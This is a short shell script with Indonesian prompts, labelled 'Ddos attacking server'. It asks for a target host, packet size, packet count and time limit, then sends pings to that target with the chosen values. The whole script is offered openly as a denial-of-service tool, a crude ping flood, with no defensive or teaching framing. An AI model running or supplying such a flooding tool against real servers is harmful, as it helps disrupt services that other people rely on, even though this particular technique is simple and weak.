echo -e "\e[32;01m"
setterm -bold
echo Ddos attacking server
echo -n "tujuan : "
read tujuan
echo -n "packer-size :" 
read size
echo -n "jumlah kiriman :" 
read jumlah
echo -n "batas waktu yang di inginkan : "
read batas
echo -e "\e[31;01m"
ping -s $size  -c $jumlah  -w $batas $tujuan
return
